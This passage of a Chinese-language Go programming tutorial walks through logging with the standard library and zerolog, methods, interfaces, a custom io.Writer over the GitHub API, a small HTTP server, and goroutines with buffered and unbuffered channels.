<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    file, err := os.OpenFile(<span class="string">&quot;info.log&quot;</span>, os.O_CREATE|os.O_APPEND|os.O_WRONLY, <span class="number">0644</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line">    log.SetOutput(file)</span><br><span class="line">    log.Print(<span class="string">&quot;Hey, I&#x27;m a log!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="zerolog"><a href="#zerolog" class="headerlink" title="zerolog"></a>zerolog</h4><p>重构依赖<code>go mod tidy</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/rs/zerolog&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/rs/zerolog/log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    zerolog.TimeFieldFormat = zerolog.TimeFormatUnix</span><br><span class="line">    log.Print(<span class="string">&quot;Hey! I&#x27;m a log message!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>另一有用功能是你可以快速添加上下文数据，如下所示：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/rs/zerolog&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/rs/zerolog/log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    zerolog.TimeFieldFormat = zerolog.TimeFormatUnix</span><br><span class="line"></span><br><span class="line">    log.Debug().</span><br><span class="line">        Int(<span class="string">&quot;EmployeeID&quot;</span>, <span class="number">1001</span>).</span><br><span class="line">        Msg(<span class="string">&quot;Getting employee information&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.Debug().</span><br><span class="line">        Str(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;John&quot;</span>).</span><br><span class="line">        Send()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行前面的代码时，将看到以下输出：</p>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;level&quot;:&quot;debug&quot;,&quot;EmployeeID&quot;:1001,&quot;time&quot;:1609855731,&quot;message&quot;:&quot;Getting employee information&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;debug&quot;,&quot;Name&quot;:&quot;John&quot;,&quot;time&quot;:1609855731&#125;</span><br></pre></td></tr></table></figure>

<h3 id="method-oop"><a href="#method-oop" class="headerlink" title="method(oop)"></a>method(oop)</h3><p>usage：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(variable <span class="keyword">type</span>)</span> <span class="title">MethodName</span><span class="params">(parameters ...)</span></span> &#123;</span><br><span class="line">    <span class="comment">// method functionality</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>例子</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> triangle <span class="keyword">struct</span> &#123;</span><br><span class="line">	size <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> coloredTriangle <span class="keyword">struct</span> &#123;</span><br><span class="line">	triangle</span><br><span class="line">	color <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> square <span class="keyword">struct</span> &#123;</span><br><span class="line">	size <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法对于go来说就是特殊的一个函数，即函数名之前有一个括号里注明属于的结构体(对象)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t triangle)</span> <span class="title">perimeter</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> t.size * <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// overload　重载上面的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t coloredTriangle)</span> <span class="title">perimeter</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> t.size * <span class="number">3</span> * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s square)</span> <span class="title">perimeter</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> s.size * <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//有点类似构造函数初始化时直接赋值</span></span><br><span class="line">	t := triangle&#123;<span class="number">3</span>&#125;</span><br><span class="line">	t1 := coloredTriangle&#123;triangle&#123;<span class="number">3</span>&#125;, <span class="string">&quot;blue&quot;</span>&#125;</span><br><span class="line">	s := square&#123;<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter (triangle):&quot;</span>, t.perimeter())</span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter (triangle colored):&quot;</span>, t1.size, t1.perimeter())</span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter (normal)&quot;</span>, t1.triangle.perimeter())</span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter (square):&quot;</span>, s.perimeter())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">Perimeter (triangle): <span class="number">9</span></span><br><span class="line">Perimeter (triangle colored): <span class="number">3</span> <span class="number">18</span></span><br><span class="line">Perimeter (normal) <span class="number">9</span></span><br><span class="line">Perimeter (square): <span class="number">16</span></span><br></pre></td></tr></table></figure>





<h3 id="interface-oop"><a href="#interface-oop" class="headerlink" title="interface(oop)"></a>interface(oop)</h3><p>Go 中的接口是一种用于表示其他类型的行为的数据类型。 接口类似于对象应满足的蓝图或协定。 在你使用接口时，你的基本代码将变得更加灵活、适应性更强，因为你编写的代码未绑定到特定的实现。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">type</span> Shape <span class="keyword">interface</span> &#123;</span><br><span class="line">	Perimeter() <span class="keyword">float64</span></span><br><span class="line">	Area() <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Square <span class="keyword">struct</span> &#123;</span><br><span class="line">	size <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Circle <span class="keyword">struct</span> &#123;</span><br><span class="line">	radius <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// “矩形”的接口实现</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Square)</span> <span class="title">Area</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> s.size * s.size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Square)</span> <span class="title">Perimeter</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> s.size * <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ”圆形“的接口实现</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Circle)</span> <span class="title">Area</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> math.Pi * c.radius * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Circle)</span> <span class="title">Perimeter</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span> * math.Pi * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//　打印信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printInformation</span><span class="params">(s Shape)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, s)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Area: &quot;</span>, s.Area())</span><br><span class="line">	fmt.Println(<span class="string">&quot;Perimeter:&quot;</span>, s.Perimeter())</span><br><span class="line">	fmt.Println()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用接口的优点在于，对于 Shape的每个新类型或实现，printInformation 函数都不需要更改</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s Shape = Square&#123;<span class="number">3</span>&#125;</span><br><span class="line">	printInformation(s)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> c Shape = Circle&#123;<span class="number">6</span>&#125;</span><br><span class="line">	printInformation(c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="扩展现有实现"><a href="#扩展现有实现" class="headerlink" title="扩展现有实现"></a>扩展现有实现</h4><p>假设你具有以下代码，并且希望通过编写负责处理某些数据的 <code>Writer</code> 方法的自定义实现来扩展其功能。</p>
<p>通过使用以下代码，你可以创建一个程序，此程序使用 GitHub API 从 Microsoft 获取三个存储库：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io.Copy(os.Stdout, resp.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行前面的代码时，你会收到类似于以下输出的内容（已缩短以便改善可读性）：</p>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;id&quot;:276496384,&quot;node_id&quot;:&quot;MDEwOlJlcG9zaXRvcnkyNzY0OTYzODQ=&quot;,&quot;name&quot;:&quot;-Users-deepakdahiya-Desktop-juhibubash-test21zzzzzzzzzzz&quot;,&quot;full_name&quot;:&quot;microsoft/-Users-deepakdahiya-Desktop-juhibubash-test21zzzzzzzzzzz&quot;,&quot;private&quot;:false,&quot;owner&quot;:&#123;&quot;login&quot;:&quot;microsoft&quot;,&quot;id&quot;:6154722,&quot;node_id&quot;:&quot;MDEyOk9yZ2FuaXphdGlvbjYxNTQ3MjI=&quot;,&quot;avatar_url&quot;:&quot;https://avatars2.githubusercontent.com/u/6154722?v=4&quot;,&quot;gravatar_id&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://api.github.com/users/microsoft&quot;,&quot;html_url&quot;:&quot;https://github.com/micro</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>请注意，<code>io.Copy(os.Stdout, resp.Body)</code> 调用是指将通过对 GitHub API 的调用获取的内容打印到终端。 假设你想要写入自己的实现以缩短你在终端中看到的内容。 在查看 <a href="https://golang.org/pkg/io/#Copy"><code>io.Copy</code> 函数的源</a> 时，你将看到以下内容：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Copy</span><span class="params">(dst Writer, src Reader)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span></span><br></pre></td></tr></table></figure>

<p>如果你深入查看第一个参数 <code>dst Writer</code> 的详细信息，你会注意到 <code>Writer</code> 是 <a href="https://golang.org/pkg/io/#Writer">接口</a>：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Writer <span class="keyword">interface</span> &#123;</span><br><span class="line">    Write(p []<span class="keyword">byte</span>) (n <span class="keyword">int</span>, err error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你可以继续浏览 <code>io</code> 程序包的源代码，直到找到 <a href="https://golang.org/src/io/io.go?s=12980:13040#L411?azure-portal=true"><code>Copy</code> 调用 <code>Write</code> 方法</a>的位置。 我们暂时不做任何处理。</p>
<p>由于 <code>Writer</code> 是接口，并且是 <code>Copy</code> 函数需要的对象，你可以编写 <code>Write</code> 方法的自定义实现。 因此，你可以自定义打印到终端的内容。</p>
<p>实现接口所需的第一项操作是创建自定义类型。 在这种情况下，你可以创建一个空结构，因为你只需按如下所示编写自定义 <code>Write</code> 方法即可：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> customWriter <span class="keyword">struct</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>现在，你已准备就绪，可开始编写自定义 <code>Write</code> 函数。 此时，你还需要编写一个结构，以便将 JSON 格式的 API 响应解析为 Golang 对象。 你可以使用“JSON 转 Go”站点从 JSON 有效负载创建结构。 因此，<code>Write</code> 方法可能如下所示：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> GitHubResponse []<span class="keyword">struct</span> &#123;</span><br><span class="line">    FullName <span class="keyword">string</span> <span class="string">`json:&quot;full_name&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w customWriter)</span> <span class="title">Write</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> resp GitHubResponse</span><br><span class="line">    json.Unmarshal(p, &amp;resp)</span><br><span class="line">    <span class="keyword">for</span> _, r := <span class="keyword">range</span> resp &#123;</span><br><span class="line">        fmt.Println(r.FullName)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(p), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，你必须修改 <code>main()</code> 函数以使用你的自定义对象，具体如下所示：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    writer := customWriter&#123;&#125;</span><br><span class="line">    io.Copy(writer, resp.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在运行程序时，你将会看到以下输出：</p>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microsoft/aed-blockchain-learn-content</span><br><span class="line">microsoft/aed-content-nasa-su20</span><br><span class="line">microsoft/aed-external-learn-template</span><br><span class="line">microsoft/aed-go-learn-content</span><br><span class="line">microsoft/aed-learn-template</span><br></pre></td></tr></table></figure>

<p>由于你写入的自定义 <code>Write</code> 方法，输出效果现在更好。 以下是程序的最终版本：</p>
<p>Go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GitHubResponse []<span class="keyword">struct</span> &#123;</span><br><span class="line">    FullName <span class="keyword">string</span> <span class="string">`json:&quot;full_name&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> customWriter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w customWriter)</span> <span class="title">Write</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> resp GitHubResponse</span><br><span class="line">    json.Unmarshal(p, &amp;resp)</span><br><span class="line">    <span class="keyword">for</span> _, r := <span class="keyword">range</span> resp &#123;</span><br><span class="line">        fmt.Println(r.FullName)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(p), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    writer := customWriter&#123;&#125;</span><br><span class="line">    io.Copy(writer, resp.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="web-api"><a href="#web-api" class="headerlink" title="web api"></a>web api</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> dollars <span class="keyword">float32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d dollars)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;$%.2f&quot;</span>, d)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> database <span class="keyword">map</span>[<span class="keyword">string</span>]dollars</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db database)</span> <span class="title">ServeHTTP</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> item, price := <span class="keyword">range</span> db &#123;</span><br><span class="line">        fmt.Fprintf(w, <span class="string">&quot;%s: %s\n&quot;</span>, item, price)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    db := database&#123;<span class="string">&quot;Go T-Shirt&quot;</span>: <span class="number">25</span>, <span class="string">&quot;Go Jacket&quot;</span>: <span class="number">55</span>&#125;</span><br><span class="line">    log.Fatal(http.ListenAndServe(<span class="string">&quot;localhost:8000&quot;</span>, db))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//访问网站会出现</span></span><br><span class="line">Go Jacket: $<span class="number">55.00</span></span><br><span class="line">Go T-Shirt: $<span class="number">25.00</span></span><br></pre></td></tr></table></figure>







<h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><h4 id="无缓冲channel"><a href="#无缓冲channel" class="headerlink" title="无缓冲channel"></a>无缓冲channel</h4><p> 无缓冲 channel 同步通信。 它们保证每次发送数据时，程序都会被阻止，直到有人从 channel 中读取数据。</p>
<p>无缓冲匿名函数实现并发打印1-10</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(n <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">		 		ch &lt;- n</span><br><span class="line">		 		<span class="keyword">return</span></span><br><span class="line">	 	&#125;(i)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</span><br><span class="line">		fmt.Print(&lt;-ch)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>无缓冲非匿名函数实现并发打印1-10</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> run_10(i, ch)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</span><br><span class="line">		fmt.Print(&lt;-ch)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run_10</span><span class="params">(n <span class="keyword">int</span>, ch <span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	ch &lt;- n</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	start := time.Now()</span><br><span class="line"></span><br><span class="line">	apis := []<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;https://management.azure.com&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://dev.azure.com&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://api.github.com&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://outlook.office.com/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://api.somewhereintheinternet.com/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;https://graph.microsoft.com&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建一个channel用于传递并发之间的消息</span></span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, api := <span class="keyword">range</span> apis &#123;</span><br><span class="line">		<span class="comment">//让checkAPI并发运行,发送channel</span></span><br><span class="line">		<span class="keyword">go</span> checkAPI(api, ch)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// channel返回了apis数量的消息，需要全部接收下来</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(apis); i++ &#123;</span><br><span class="line">        <span class="comment">//接收channel</span></span><br><span class="line">		fmt.Print(&lt;-ch)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	elapsed := time.Since(start)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Done! It took %v seconds!\n&quot;</span>, elapsed.Seconds())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkAPI</span><span class="params">(api <span class="keyword">string</span>, ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	_, err := http.Get(api)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// 向channel返回消息,相当于返回值通过channel传送回去了</span></span><br><span class="line">		ch &lt;- fmt.Sprintf(<span class="string">&quot;ERROR: %s is down!\n&quot;</span>, api)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ch &lt;- fmt.Sprintf(<span class="string">&quot;SUCCESS: %s is up and running!\n&quot;</span>, api)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="有缓冲-channel"><a href="#有缓冲-channel" class="headerlink" title="有缓冲 channel"></a>有缓冲 channel</h4><p>将发送和接收操作解耦。 它们不会阻止程序，但你必须小心使用，因为可能最终会导致死锁</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    size := <span class="number">2</span></span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, size)</span><br><span class="line">    send(ch, <span class="string">&quot;one&quot;</span>)</span><br><span class="line">    send(ch, <span class="string">&quot;two&quot;</span>)</span><br><span class="line">    <span class="comment">//如果没有go会导致死锁，创建goroutine（使用go关键字）就不会产生这个问题</span></span><br><span class="line">    <span class="keyword">go</span> send(ch, <span class="string">&quot;three&quot;</span>)</span><br><span class="line">    <span class="keyword">go</span> send(ch, <span class="string">&quot;four&quot;</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;All data sent to the channel ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line">        fmt.Println(&lt;-ch)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="channel方向"><a href="#channel方向" class="headerlink" title="channel方向"></a>channel方向</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">chan</span>&lt;- <span class="keyword">int</span> <span class="comment">// it&#x27;s a channel to only send data</span></span><br><span class="line">&lt;-<span class="keyword">chan</span> <span class="keyword">int</span> <span class="comment">// it&#x27;s a channel to only receive data</span></span><br></pre></td></tr></table></figure>

<p>example</p>
